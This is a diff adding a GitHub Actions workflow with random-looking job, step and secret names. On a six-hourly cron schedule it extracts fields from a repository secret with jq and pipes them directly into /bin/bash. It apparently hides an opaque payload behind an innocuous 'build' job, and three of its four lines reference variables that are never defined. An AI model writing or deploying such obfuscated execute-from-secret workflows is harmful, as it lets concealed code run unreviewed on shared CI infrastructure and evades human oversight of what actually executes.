@@ -1,0 +1,20 @@
+name: caochenxi8710
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caochenxi8710
+        env:
+          gpax3700: ${{ secrets.gpax3700 }}
+        run: |
+          echo $gpax3700 | jq -r .vo2231 | /bin/bash
+          echo $ut2 | jq -r .frlty235 | /bin/bash
+          echo $fa11158 | jq -r .yow6171 | /bin/bash
+          echo $mznhm3593 | jq -r .tf97 | /bin/bash
+
